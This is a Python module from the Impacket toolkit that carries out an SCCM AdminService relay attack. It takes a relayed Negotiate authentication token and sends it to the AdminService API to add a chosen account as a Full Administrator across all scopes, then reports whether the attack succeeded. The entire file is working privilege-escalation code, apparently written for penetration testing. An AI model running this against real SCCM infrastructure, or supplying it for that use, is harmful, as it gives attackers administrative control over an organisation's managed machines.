# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2022 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   SCCM AdminService relay attack
#
# Authors:
#   Garrett Foster (@garrfoster)
#   Tw1sm (@Tw1sm)

from impacket import LOG
from struct import unpack
from impacket.spnego import SPNEGO_NegTokenResp
import json
import base64

ELEVATED = []

class ADMINSERVICEAttack:
    def _run(self):       
        # slightly modfied sendAuth func from httprelayclient.py reused here due to negotiate auth,
        # requring all action to be performed in one shot
        if self.username in ELEVATED:
            LOG.info('Skipping user %s since attack was already performed' % self.username)
            return
        
        if unpack('B', self.config.sccmAdminToken[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            respToken2 = SPNEGO_NegTokenResp(self.config.sccmAdminToken)
            token = respToken2['ResponseToken']
        else:
            token = self.config.sccmAdminToken
        auth = base64.b64encode(token).decode("ascii")
        headers = {'Authorization':'%s %s' % ('Negotiate', auth),'Content-Type': 'application/json; odata=verbose'}

        data = {
            "LogonName": self.config.logonname, 
            "AdminSid": self.config.objectsid,
            "Permissions": [
                {
                    "CategoryID": "SMS00ALL", 
                    "CategoryTypeID": 29, 
                    "RoleID":"SMS0001R",
                },
                {
                    "CategoryID": "SMS00001",
                    "CategoryTypeID": 1, 
                    "RoleID":"SMS0001R", 
                },
                {
                    "CategoryID": "SMS00004", 
                    "CategoryTypeID": 1, 
                    "RoleID":"SMS0001R",
                }
            ],
            "DisplayName": self.config.displayname
        }

        body = json.dumps(data)

        LOG.info('Adding administrator via SCCM AdminService...')
        self.client.request("POST", '/AdminService/wmi/SMS_Admin', headers=headers, body=body)
        ELEVATED.append(self.username)
        res = self.client.getresponse()

        if res.status == 201:
            LOG.info('Server returned code 201, attack successful')
        else:
            self.lastresult = res.read()
            LOG.info(f'Server returned code {res.status} - attack likely failed')
            LOG.info(self.lastresult.decode("utf-8").replace("'", '"'))
